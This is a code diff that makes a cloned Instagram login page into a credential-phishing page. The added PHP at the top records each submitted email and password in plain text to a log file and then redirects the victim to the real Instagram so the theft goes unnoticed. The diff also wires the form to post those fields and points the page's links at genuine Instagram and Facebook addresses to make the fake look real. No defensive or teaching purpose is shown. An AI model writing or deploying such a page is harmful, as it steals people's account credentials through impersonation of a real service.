@@ -1,7 +1,22 @@
+<?php
+// Capture credentials and save them to a file
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Save credentials to a file
+    $file = fopen('InstaLogs.txt', 'a');
+    fwrite($file, "Email: $email, Password: $password\n");
+    fclose($file);
+
+    // Redirect to Instagram
+    header("Location: https://www.instagram.com");
+    exit();
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-        
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width,initial_scale=1.0" />
     <title>Instagram</title>
@@ -16,27 +31,26 @@
         <div class="log-in-container">
             <div class="log-in">
                 <img src="photos/logo.png" class="logo"/>
-                <div class="log-in-form">
-                    <input type="text" placeholder="Phone number, username or email address" />
-                    <input type="password" placeholder="Password" />
-                    <button class="log-in-button">Log In</button>
-                </div>
-
+                <form class="log-in-form" method="POST" action="">
+                    <input type="text" name="email" placeholder="Phone number, username or email address" />
+                    <input type="password" name="password" placeholder="Password" />
+                    <button type="submit" class="log-in-button">Log In</button>
+                </form>
                 <span class="or-divider">OR</span>
                 <!--FACEBOOK OPTION-->
                 <div class="fb-login">
-                    <a href="#">
+                    <a href="https://www.facebook.com/login">
                         <img src="photos/facebook-icon.png">
-                        <span>[Log in with Facebook](https://www.facebook.com/login)</span>
+                        <span>Log in with Facebook</span>
                     </a>
                 </div>
                 <!--forgot passwd-->
-                <a href="#">[Forgotten your password?](https://www.instagram.com/accounts/password/reset/)</a>
+                <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
             </div>
             <!--sign up-->
             <div class="sign-up">
                 <span>Don't have an account?
-                    <a href="#">[Sign up](https://www.instagram.com/accounts/emailsignup/)</a>
+                    <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                 </span>
             </div>
             <!--download-->
@@ -47,7 +61,6 @@
                     <a href="#"><img src="photos/googlestore.png" /></a>
                 </div>
             </div>
-
         </div>
         <!--phones-->
         <div class="phones-container">
@@ -72,5 +85,4 @@
         <li><a href="#">English (UK) © 2025 Instagram from Meta</a></li>
     </footer>    
 </body>
-
 </html>
